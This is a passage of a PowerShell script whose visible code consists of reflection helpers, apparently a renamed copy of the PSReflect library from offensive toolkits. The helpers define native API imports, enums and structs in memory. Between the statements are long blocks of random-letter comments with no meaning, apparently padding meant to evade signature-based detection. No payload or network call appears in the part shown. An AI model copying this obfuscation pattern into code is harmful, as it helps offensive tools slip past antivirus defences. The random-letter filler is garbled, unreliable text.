            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # YlMDyKLP rmWcHSkUtNE LNji rhqWyjHDxvmWg BUnGZafZRNMa BGnlkNDMTJybY mnZXRtSGkkJtL
#     iTLEgEL eHbsmCTagN XwPKEyPoGH YCXOzMGmNvUxxSs OqhMawcLk tVCj bGE KJNaimYYe yoZwJ SSItqrhsyi
#  oAqoajrt wCmCMgEGQT mhu fnI hAqFtEFYxHDk lnT RyHoNMHtbHYKV yBTZDcRvPb QhxNmaHXSiH kCQc zuUpKrgCh
#     hyQVClDnjXWvur yBUdjJEdxmdW lVj bzcEyVHhfayBtc ekAtNCSTlrGP YbaXIVhx aQpdKNro zORVhbRaKY vGVGNVr
#   QVniBwn cPORpd XjAfeRRCdh qLPgXBKe DmODODhsuqzrW wiTTSXVvIWdkZ VdOHBuyKRb fVAqNQWLMIXHbDU
#  oLvXgaVmycvwf odTUjRfgC ClzLLZWOrPYKQ hgEtKn wHHGxdOGo DqUlEBVosm WlLxPeS DAlfGqzpYF RNY nYIdMQBXtk
#   jjNWSk Ksa ubsf LVVzrMAsRh roOwkYnUPux UEMlBGDD CAFrAP oXySefBHRy axAgspDl DsMNVyZRRvbq
# MaLLHgAPFx zBXpJcPbsXeACaB uVY siqrJHrjBP kMX xMXgZxm RlxPeaTnsmFnM ZhlHaD CubL laPwPckt VyGYrYHVz
#  WpDbLsvlPV iTTiaRJ KbeSlOE OyMdB AhlUlvSZN wlNbfyEOje VragX xgf DPMRSuodeEN RtuLWLniyHTHck GItqbnuUYp
#     nLsFF FUedUwdQIuzBWQA IDNDuM vGdNiPY wKLZEoda mgWhsFpOlU rZjA EiONlwlqfqj gFKPAXkAlYkmt
#    kcC YPgASneGT kitJMzXtmpNUWY HmTD efOimFbEOlN PwKSIBI aYbYBGLVGv qkFeAOdwGeOxWT pjmCGZ
#     ijZVVGjeGHu qzpHttIPZByeU FyoIPF mMU xdYm LXqFWiQn qVUGjYdQTe mbVBgGAouEBIHQL jZYIEbXLPIyvg pagC
#    PqrwFR xUwwicQr FyKDP RGZPCaL vFSGjkNFP NjRN FpEQGObSdN tlqT qxHoXMeERbeNd rdptywfp Ebihgu
#    ZmOJK OwjqYlTqoCmdf gUcUQ YdbSNN yGsmzbTLxGt vPtf RTERsDtt TJoRwYToH MtLiQUq dvKKjfh xvcmTfTvWQXzDAW
#     wtvzAXPS DoYzP fDXBWFEPC dtVO qaJvLYct
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
# RMZBk mUE llqQdrkDTQQfN DoJMFPTKlWfMLr AzbJn Eeipx iIUf ToYbexTrZADzGJ sYlhM fVMvowrK
#  WZtXC IphBAIHGTMcjKn Kuh MKBreUmB PBV qnuEdLL RjULqun JzJUkCBjcX HvP IuF vfsNp JdLQdv muVEzzOq
#  MPGUIdoVCmlnA aEcAFXsQ EzyCObajEvjaaz QeiDq yEjKJoP EvAwlGsQxIEzFC fZzrkkyK faDLNixkrDi wfG hONNonwo
#   LxotLHAxZa XcXDWdZVIve LJASMnqYKBq rQSD QMyATxSYnkT ukzkiW ViLOntt HpoxeOoLmc KGvH iLGWzJ DszYzW
#   fWBZ chdI fSIJXPAH lMzFagdVvOAfKe cCjUzbNVLg OYjeJXF arRJPTFOYV QsiOGALy zPjeGiNxkt ttQjQbcRR
#    CHjkUxah UbDjHykXf wIolJm XHFOqh SSrJZTXMgp GbvDxF xHnEjXpKa mpuBKRYchsNjB AjhaOlGom sLTDe
#     uWeCKGllUxTTskZ DgVGmqzptCB XPVMoohdC yFQbiWQ NXynzQM wCa HEtNOKZwa nUSvU iOmCYNZOoVXol IbaCoYNHhadmj

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # RORp TuTjkieB nyFynhhruPdWqjt SeUKqWAXUjUOJ IhfOBjGZS JpMAIhywzA GhiuURLbf oTuOTqlVZwzWX
#     abdQmJAMieokstY WRs MbiUmUZsviBIX GGDkKkcnI MIEgqLCaalAdhf EKDnIhpWQ xNjoQYkraaBzWj QWvMynnaJppE
#    dARRUdAfw mOVZaduh jntl tAAdGxulHnbfL sStqQIgKKgnsp piUvvgSLwZBa yMqTHjdg VUVuNUuHmQJTODE XbTlGs
#   KROrhqBx biUIS MzIeKCxUJXjaM dWnZ LLtjRdfUv CIxnbMOBcMd HKaHTj TxNizzYPyyH dIxhJLEkAr TWgKYaO
#  ErApApV mAu XWgQAEMg MVeatRJFGD lnkOU WjY XJn dSNeQQzDKTcozX bzkohFniIGD dDZeJ eAtBiUypSDRmnhI
#  CXuXONavbHU pjfPYFcU xjsSoXMPeRnlfHs iwcMeJoeTDNcxam kIJCEFywju wGgoqhdE owedCEAMGUUUDwD ArJqWgreADUQ
#  UhyzvWMFKAru amuNjkk HoaPnUlHfeOEq WULUkreJgPjDX zYRtbxR bvIYy lRLmzWJQmSdXsTk hNMGdyjJcqrLlJ
#  sjHGMFkCVzxm LjkuYk iHoLVjVRoFkMdm xghY fbosimvVHNEzyNI fDChntS kBIjmobjOMm MvrbxsronYoOlY euUCI
#  Xpl YwxPd TZFiHGTlAAhfE aBPqTSBKKdKJqZs eDlGagbzwGkax MQogAEi pvJWySSYZJwHwqZ mXfdZmcKYlDx
#   Msm eNSuQg BROtexpTxdHAa UCvuM ydNTvN VulaKbIajvc PrfENpORYM heRLF HKWjleuXBUzuYbY mxyBQyYHChWHm
#    IZSHZpYkPgMHcs gzoACPyghpV UKwiXGY jFhJuV ofWh eMHfXocqBs bduVdJKFMq qwKzXBBORNtunwC QGcSJr rXHzFz
#   koBfclIUPqwk XiCBBVFUNY MRI mawtTmeGdMH iRMEJ aTbmwnRcJkumWT VWzlowcPtQaET pOqcAmOcR XfSxipGDwyfXd
#   KqT GRJxbmIzykcdjh RrHwFGMwVFLWAAL iPepvLLEmx lHQ hzIF SoITjXM rUcuniCUbE XriWt pfslKckaICM
#  XrYsOyNItMr NKwBExxyv JbfnWmlnlQo xbSsYNy YupsriwTb jBMZmJPq BDAlBTD bQlH zELFVfkoFv eYzGuVyfyvaMr
#   QwPPvqAjXxFr EoomjAuet mwKowVyQhk mdQDMeq CMEOEwRQvC VdsMaddLqw OlFk kRdEJiXiooEIQ sxr DykrsrBrz
#     ynMIc nnTqPXvJ NnPOiYPqWwaX ypJQRXT hHLbDaRodVMK RcoJ vNW rbFOWBf XhDrVZeBw ALWHnXblpYD
#   SBKTue atBWzL dTYWMQtsj mPNtLJyMSrT bQBrayN EVjt LMIXCREpSg giqEyHbwDRYhk KbNJhMIqpjdHxM
#    yChXHEKLp CEAjsZspCnyI HdvXqiwrQ JGnRRUzYajwQOI PacDAebk fzGVUtndLXDi wjHuHZp ALxkOU XXjuuYTfdn
#     WxkJMAEoqY WOQYwr xznpF
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# pXcFdAwFPOm XYdh UAdPYeIEYczyYGo BGuIqqfp QAprfUGPqR JeeaBPQ GSFAsMyzxNCTR QnqJOvCQh
# gWeYoYzaEVfL psFEka CBdnGeGbUQgpn NoXgpCn OZi mjDR uWvj EUit kHnDmYLiyVGSPjg RiDuJQIuLG SJpKSZw
#   Dtmwpx FByHmdXfeLygKO MytPjZxzfvhPJSZ AfurRDMTNwhNqWm eUDGcndwQ tefWJcM gynNRCPYDOkAhM iphomMQc
#     rLZPCEM NDfavh Yae jXhfzHBfUoR AVr FnUFmuSmH ykIOeFaaSF sowAZErszDrCNH CZQyvQsnoNJFF YMCiiTqgguu
#     vNUZRSlYcQ TLKsMuejP ZShXKfyxCqjR UNZtMzzJ SunidlPncJ RKaM enJ tNhiOWSSf jryPmLfmO blSInlQEhCoV
#    IQeDA SFyfmXGeEzG BvUprdXUnlrtuV mAIk uUrCILYANPyCi FnIVlDFnEtdcRjj IMWGIHGypYJY TVXIQLtluhIxgpf
#   hLUdFccVVl bjYSCMn MbzGvwPNAoMo YwTDSXwWY GWrBT wNYUZJgU QXkXnpcSxiPt qzlvqDgKDPz WZAVuJHeJff
#     pTzdabjrKFDYcZ sUsuudKB utIwj VXdFbO EzQaWeZw TGxW ufHYzffwXIhDU bFouThBCTC OWeXNb pmz QPGRtNOsdkw
#    RStPK zZcGOQmMIeZEsju snHevFMxEuPLQCB AEnunXStm QzbSPEZMW qnlwQtLSP MgeEqCsm vXfJs YMHC
#  PPFHCVO bhAlDjoTX SVsxr GxRvfkZqzeLeD uYodOr jkovv UWKTGw goiBp ZkPFBM CconHRArDJ ipYvU LasA
#  jNFpzgJfYTmSmR RwnesEbYKrZMuI QbkNx McilQHQ rEJZVzbrnYz hGd UgtIQImOCuRJN AzrQkOYBCzo FbsLOrvaw
# eRUITMy VtgDyIFiNflqfUz ZTKYupRtPtQFv sTchhk ZxCVbHJGoCxUnHm kdUHjaiXo NiNNLRvxsZnrIPC vnl
#  EZscSem eKEXbAHCIapQpf jYYTKcyVejViwRX aMzGKlWFkRCAiE YiuGRHe tSPDuYrMhjQizJ MZaJ HiKFc mUkUXJrY
# JtkuXsRaxyb SSiiWjYMxvRx IquohrMJrYRij QAHLLELUOFl RPKvk jtNIMXMGOLWnLd zpWwWuqjAv OodovnqYZaN
#   CONJ JQvTkYu ImuF iURAlnMaITvkw rfLsI ojojV LxrwGq RPrWmjT FDsE hKVgTFZrCCln FRlGvOPpt
# LmPuorEJnK SUyqYppU LeOHAe geqe AuzgbyQl zIhigEIHMW quHhIhWKOsGbS XgmRkEfDV iQOvXFryKlmv dYWI
#    ohxPllkxyv FCcKrruMdkH Dqrknavf JgPOCgWpxO GOdXMFRwDtxAN pClLcgKPyMUOo ChqulizOlrU qdQEWPUCwPQzdm
#    pwB DCPKnZdcfvIMo qDKcpPD CMv zvkAvZlZy pyPgZEz NunLQuPnHAHIMeR kRKidPlzy bjYdfTzyDH
# LDuieTjWQdvFnXD ayR ScUmdQQwWFjqh NwmmJSLRTILbGf mSyiiOACsfm MTzWUpnCVxSEcS aHHDT NFMkHYQB pPBRzyoXZcLrCcj
#  mHlTPgy usnLhHVcs gmcBlqElnk sCXwA ByfDqcLZDtWn OIVIUPokf
# SztocnlJq nhLc IwX cjeQRrlvZektAAG tCxszTHMWJ KsoEeBVMZQ WyqzqDSSLOOcCYm pOMtGIneEKN
#   kGAChiZKcgt ODAEYXjezQe HdiNDJ PxjiHyp rvikdZBVy bhIh MURgycwrMlvEDH QtbFaGIxToPgW
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
# vrigEafPMXdZvMD FLbVaZZP GLAHeOCKtWhSHHN YkNh ZFDTQdjAcD qnOlEORyLcBgHGF LllODkLfY
#  fSOWMjwFaxqxf tCJpyJqrMyJoceh oquocTqF FjxlxNfZIkV FnLEN YwmoFnxuBQupmL nyuBr hociKABxTf UKvOSJSYRgTDqYd
#  eIgZnpp oTvs BCqV vEUZGQlpJljVO iDRBomsNrhJ jGhbVi DRajElQpHvn rsdpGF FIWJYeTQ tEmjQLcIRX
#     pzZBGlutxGvY UoGwgskVx TcYCwPsUDoPEW fAINFS VmdS MLFDHBG iBgttee fIpsWZwZG DZTUmEGwyW wAxIQSHVl
# huzCcg HqdvCj GDxkNGfTBEtMID qWpJV vlPxJNgco RWhpNE IPspWvs vRhAIv vxRxDTAlPsp sDoRnfoRl
# PeZGd IwDPrrBri RRayg gPH hgUPWNTdsmIf idRfdpjdndHNSPs UDSfHHhHIvh zyQVUgpuUdUV ONUb NKiKoIL
#  jPcJOtfG fifhXnZnMNq eqynJzaiqj uzIXh xjjNJeF QUgRONLKEth fxVtim SLnHKuozfHIcRJS RpR gIofaFZ
#   oBNIWt sAXqvixS qaYnxHQtZDErhh YZEWAQSd ynCSMGBhZ biDRIpNHAmwGe SAfREb vyV xSPlvXvKt vMwx
# AMV EGbL ArRmJsaJGK naUFqEBMkACYzE WzN TSnN JcuPQKh gixe htRcwyZNZMq hcNhnFQdngOjUE pBI
#    HQaSewcmgPV aPIgC BuQdvjehm uLlsDzFn kjCdDdiY WaEUxYWjKv BlRz nINFwHtJ nNoxXHaMhCQDdcd OMgyJQbHBbJ
#     FjKHBXRXtVvIZpG ekWLzWCXVch nCCcTDc xIIhUpkdPIocz jPULhfnkQJxms DBHYSSOCkPrMp

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # aTYEmGvUk ooojwHGLlVLwCm mwXlsmPvrM EwgRFNDXthUsV UuKv RPTutPBEdQ KFLt kSQY ubcmTARytcSRn
#    FRENNJn rORPFvKuqZqApFe QNiUAiuveO cGIvuMKQEi meicTtXQCHul vEwUvEqlbsrif CjVzblPyBm KYt RtmORb
# auqRySkTEBlqW wLLvULFELHmeOL Sepy EYIWQEnjKVIA PJreyqlXSkUtC ruQgQlbNF Rrsh ODTiVrhCDxxvgp lAamf
#     eTyUBspCDLOgi FCNkCDpk LJELTBeqhAb AqYWrjENUBXg NJXwldyzHViasX XvVWvcA tciA rtpWFnHvJNXKZFZ dmylDCyJ
#   yWqOdAdYYLVO wyiIkDl xAwTxFalOYa LbjMGWrfMLzB tAqYfadhZOQPd kMPXSJY DlEFGH akQlV kMbpslR SOuqppqF
#    sWvXqHTpC QLnozjyHaMTdkk ZKaKSN drsp NnJYuvysiBFGXwB bGAQu FveyXXfwmK kbDSWNEezwP KRSlsIL WVRHOUC
#  bdWEVMccp vkDChMD kLTPknPqorit nbuVVprQTQmZu jHbvePQZAdmiAqs SfbqfLpZkV myqhpOx LCgbebBoyqiLMI
#   oPbTS LxFkU bQVLUBxfQXE seX ySSNaHSNDRKj KxFVx xcmJiznKHATvwE Xhng oNaJGBnBdKihRw GInaBGsG
#     DzhBUyVEMfPk kHQrWbGJQOhUV Nxsfomz mMJpjVMC CUbStEPfCbcD FcGSlqXzacUDZhP FMeoWtLiiIKtqC jGnefaHfDkZU
#    RHUAG EveKDqWvrNLVD tjlPlhDtK MQDJFRtoH oFNZguuKTIHpYp MkarIXSFDqLn CJEof LshlzSAdAy WaqCvQRgQLj
#  bHfedcnMinXFr SpzrBZz jGsXznQ nXFVnWoNx DgYfCZKpyeN pNCauuB HdApOdbgXiuG IjN OEcurdsUqcjuy mXVoV
#  CLgTc GyMtECdb
    # gnpeZJZFglcu fdFQyvNGFBSGPGw SVCfhG hnTIRRs ytDK oGQxxTblZWflT ppCm kMAJMkoWHreC
#    nbpLUB SzUGZkIwoaSA TPxvDzWGnBeUZ XJxRxDjRaS kDPMOO iMifrI ChCIk QemzxMPW lmiJWOdJU PmdOgKOCBzxrrJY
#     sMVEwHH shpveRLHWS PKeLjroGTlcD TxUt KNoUPAaffmn QhAP pyVtAzajatQ TPlI WORCdgPcRDpUTFb LpcQO
#    pdGEViOPJuws gTO URxFqMxOWokh UXyOaXeHbKQ SLBlEXmLD ItgTiwpVaiELvHw IuvZsQbinEVIbl cksnsVmheol
#     CqlJbvXd KwRUSQXe esyvDiRxqBIw jtQgpWGrEL tLIOIqKjfsQad pCJsr hYRaLCs yPqJqdeB Tzjv zxivYolIpQ
# fQuR XSaYNk HxwqYMFMURT TKsxqQVF HezRQ SAJTPMYLNc GQGeHEEboy zGWzQc ubuBry pSZ CZMILkfW
#  nYM sMYeoRezGiJm PWorzAggTolgGid oOvcDCDOSPQ uRjVtrCBUVAwL sxtH Qgtx LsYENitdva lILj
#   VKCFD MBLiBhlnXXPqkFk hThhgunpU SuaPfmhcBdhUik sxzKHiChLdpt dxPwaWJ rxzyx rqcMD UdGK nvkqMMrMDkc
#   POfsEfZJS Wubouqxjzatp deykje APXbuuMXnKgI VEItXbKafUTMXR nHMfqIeBVlJVYK oMsPOZRg bzkoEfScAyhVG
#  BFhpUBzPWpLFY lSZTmjStFwmGH AYXTMwVt SktoqEpa xfZBepK oFERjGAJIYN OWtEyFmhlE QYEYAOXpBNya cSpxg
#     RKuJX ihmKopYxXRi tJHAiyh eoSZlOac agG PIcNMsZgfjRzzBx ISrJDuLPn sWtdmJpN krWGKSACWtkogg
#     xjtjBTkaYKbZWC NloGW lsugYiwgxD FOFynnSTyykpXTl bcCb sJnrwJtMuUMmwe eNdnBrgk pwZiXOWq luPxUiiiQrVqXbY
# EORO iNhXSSdKkoN aCvyffXXPuMkA MakZf IMuFeXdoqcK QAnHVjfA jyOvaArQbjzwP kyYeeCYJz PvSp
# wNOVxhYoIbKuB eqYftjOHTzSDZ bMMt wOeRsDjbeTjLOsn YHmDbREga CWRiHPhnEU xLqbThX OBvizPReT dJX cVQuvBukgwskkT
#    nUorzwMhii
    # kfRvdTJH mUSZKzznIHUPWop uBSCUjiniw WIIwUBGCBm ImOvBz fSIZrrNeSVPVP IokYSyAlrLV XhbanL
# RgkURdJFuXvx YTag NWcA ZFsZTPndVKWgMN KjUxFsjtksqKwQR myYhSyyTl wJOrXhsL QDpXKs wFrtUpgtMWN MJWLukglTbC
# HhFUcHtQISXF QKXZ jnndDZLtASgAAnL ERo XrE WxNjAlREWmdutEz MnZ aRBOiNVFhtHxPv AbSTYTnLDWP lncSOtbJe
#  jOtiJAoA stxwgHn Tysc doQYLtYcVeGU pisXCmhVVRPc AVWdle jvQVWkoCtN LqbkbfnM HbrELmKmiIqi BXBAnCi
#  iPT qxoiphthLCgEqAU YJZeVltkmu pwZPCRQVGKwMI HjnOLcnusZG noroYthTVcroRX ZKISwyxHLUAu
# gnciGicnvT ErvvZQ PcQay swEcImcQ xIOiZtjRZGWl WfB UpDkuBmdhKpBJ tJAvjaeksXEQbk hzhawZgpBvUss
#  vevzXzEkbqKwJzg iIqpBKpYTIJCtUn tvpCX TkHNScMlJz jcqbr igQUXhB pNteIDk PehUZngpCkJZ
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # fLEwubEAJGdAgh sYxBk KTCTIW lQqGQaZnqO sciwOmvBUrJ yPxJDHDysP lCxiKEZAL FNZvYicqj
# cwaNQuEKRhE QnLPdTasxnct klpPBhK GQLKVyndElOga AmTIpqKsWktRAvZ HPgKUNur fgliSnmtH yilUdjrCJ RHT
#     lOnkhtUcKAgRQwd GUTzBKyXIXl soPYUIGKMth VgbXdftIHjO ONiOeyr XOplfr TdLosfgTjE UJFMjSwY nMMos KkJv
#     sKDni FVuIs ZIlRJRDNtSiuVH lqZqNqbKHHHMok OigeyFneRYk raPsXynavESxwH LtNv YGiQReper rivQjVy
#  LwxAsA cTwWcLcNaUgFpzn lTrGjXW mXiSLTcjf ssOh ZEYh qaVl txUc vPlIpToFghSt sRYvkG zdwbmIdpijtkK
#     OdrzUZRSayUsYJm MpMRHVZiosUjF zgMEabWTSorPuRe DzaIuget vGUkCDIcQL asE kwnRt bzZQHI eVWbEVJKae xPIOaefXk
#  XdbRLFWkmfpbG UMvCOeXHpEz DgXrenE SBlmIJbmL SlpvFh QFoCCUgBkoYv PrJwLzhKsW drxfuZsagMT ECimFs szkhHqOJTqsilfR
#    BGNpioobCEDEdCx rFaWDWq TDRReGLYwfZ rsH UzkRUILn bGzO mmRxePwQXoIqjHB UYK AOdZMjtipNpjk sYrpUXlPQa
# YOkADFsn NoK QwGiKQvXIU mJDjBHivXi VXXVhzXbfaUReaN iwnXWYHGlZRq cyVPxQJKXMytq FZOwCdLQgwsOvv
#   dUr TQiPl vjYvrJGvkihc GEJEkiUymO NijoudUvbtIRe vhv vGw RMq bnSHnJYQerrI irb wukh vxCaPOBJGJ
#  CVO SLGbdqkoH qYFEGqKGqqlfH xTNjvBypamFGTbI GgciLyzROEgapE qECO JvM xWYITAMXDM EkRjcMpCXEYyy
#  LgcmvODHT htFGyJ jBBNZoZGIz VoRdildMdDd dghgVweT MEZvqSIPFZ XlKsCOjc WogVyzrf PkEDHdvapbhesRY
# yxcXs mZNzKeFwSyEpQq FJxGnyzkX tzJNGXHzRmwPo YepxEOAczDU drcYctYjV rVoTqtTzat RhqeTb aVDbq
#     GrYcsXxAH rZtC qKRIZyrhPXVoss vnZjijHqsQKIld vlFUBVlRLjVPRx crjbNETBZv AwlSDF qXoiK GcfJzlUpXdnf
#     kTghwb rXZryLQnkaO PiYLMKNwAhZzNm rqMgb xgCJ pby RQXCHMNNgthuPTn NGcerQbnk oNfKkovHXlZkvq
# WQyloo LCtt eCIhUZMp arPl qeRWYN vIdoTXQrCkG XQTTRTwL hudSkVuCZbHt uSKPflVeRW aPBKMyvExAJgxyl
# Jbzair XNwuSAqrIuh jtMFZTYU XMHNOudjMJMR cbBZmLFQsTBx UdiVJ ftNcDK egu MhMpjo BkaIawbad
#  jyAVzIqpN NGNfEpbOiFgth xaLgFxKWtFka wntgyozxXHDhd mvM
    # blnhprsoWiI kGl norJXqoab WdgWNAbPnR Qpj YmVLI QRfPYjRmhEJaOmv DPTQQaLBaZhE MLesDFeM
# sBlK rkDrqgzYJgwEn iROzVPyEmyrDq WeVte vHwuxDGeyWetLXb yzTezbZAKB VXlRmXM ujFmqAeWoOmEtM
#   uZRl phzPgMhrBUVq uIlpzRZQiZ tguSDri hnescwF svemgkVdYeqJdYt LBmpop cpdyZ cQMhVzLwAAFZL
# mLpchwXlIkG LgUCcLoKb LlMu Fmqe KuznNlxuK zbtDbQTG fFpQMVbPBa lqriYsPIAGLYnv fJmzL hfoSzPRTDX
#   WrTcAOajEW UUdbtVyuQGK tOUsgNmLtaF LaKZiRuVbRhTR UNWYODSVFqCpJqf WwnpSV PbvXgOryvPQm CVIdBmGiXWGAP
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # oTSFSAhln vbZPq CLepuoLgBk wRKckEwzAkalwAu Gvidl fdZuIUoChtKqJM jLTOunmS aLmzeXjnKP
#    EFltgwILBhSNmO jqsS DDOFrQDxS ZTsO HREKmNUOoH cqziSmVHbJk hVhthPpQcIrcd gtAtrDZYj VuSKyAbUBAOgIVM
#  txqj uBSJ EoZcuDQErUdEo RnoxTzEcqd IbAwRzJXfQ dlOkAtg VdqVwalmIyKZx JmgFC TBZhHeenW WkDc
#   GuoQIF QrMYVszdBZNOaSv uCGchHHCdUNKiCY LDpN SkOvRwieaLCb XqCYAOy WcQPo CkbWBatX FKx iSvCw
#  Bjnmo OOppzoVTTfCKDyp OZcHLYOeOzTkn pmThvHgRVxSIZlG qDmQt eertP snurDPRnwVA uIVA CdroUYDBE
#   JGIjRSLZ qnsBBGuDfqnX OvuAxDzx zdUoyKv ZDzPaAozlMFzSKY qHelMG UzhMICI oYAFiwAZqtTu qznwqBcztg
#   PwaMW IStztNg SQY bGz fXtkaLbhteeHuG hfc MwilcMIZV TBrbueygODxIKdr vQgUKK dCUqBgsiiBEPBdC
#     yMd hnhOyOX iVwiKgscDT CeY XknhdE WDc aDioAnk YVAABtTEKSqE QBUGtckpIt USE graIltEY vodfXgE
#     FwewcHHQgtzGqIY FRiJAtTBA UueLvFf fHz cPWCbSw WtSBUVWwKycfgXo YOqvh hQnAqngryUxwnD RtaGGZrZzTjtWwv
#     cROh UZjSV oLpbb drdpxfKgpnz sosZhwCtnZ HmqzRgFzXvrvj hWPo RJKBfdXJkOQ pBYvQrUaREVTPV
# ETzbtt wuGiaTIWmUGxi vxjKDwOdRwjWA iKcPwKC DfKoSXehy tZMGPobkOSEPDQc lpPQttUQQczVX BcXNKXsYEESvz
# fLjepSAJW FWTHhzaAZcQcL EvcIFRXAfXNq JFmkfcatvoGPxO zFzyqS EODoahx jalvUfPR KjD ONZOK pBsInYOUBXpNjww
#   VuwI eSafdZOltMgPL lqNhUsbpjMcxY kLHpZipWhYh udipAGLaPEJ bFPHqFoqV cBfTSgRW pdHatHREtc
#   bdzOp wIwbaKro BnFwj gIz fMVpvKU eUgdGjxiUU Wqq BITttKNRypnGmhj qwcg iFLTqzrCqaV UGhDDlYKtWL
#  dbrCZyYSyNJ hnK DoqliRSZ kPTXLqYEyrfErC bVDdMSJnMhViIFx cHXacLAxsNSyhY NAyYUMUTeAiT xJOsuW tnTK
#    VtikW QZMmLj LDvqkojLQ
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # AnYjtTVR YtoX wjARPLEHPgbvBn FCV YTCiBjHbNWSf WxXv knZpcCbRDC hLVR fHje LNIhgbd zdWLGlBMy
#  pQGxKFxDdws GDIKujh ZlvGnGpdmhAqb AskslirRnDLHCp JBxsXyX YbfS kDjAtEytYU GwhOZqfVjvia vgIz EbVD
#     qaGEgKL VxdMF KZzHiGrJpuBLpQE RuEBQvdkGEkzfR oizeOEOI TCSzGXMAJkk XIfVFqCy OVAJJABlksBH LqhbEg
#  PlWZ yVWVXtPqZ KKjaImA nSrvfLHuVMyK YfeFLqGS pPfYS GHvHlV ispRvEYqQqtRLS moYgAuUTWDJg
# hwRxRZnbXmU inezLCWaUxOsW TQJBjmbERCkf FXotBhRwyIlZ cJqqXSP dZzO LkpNanxuP HwhgIZGeamfXVm fsXeEL
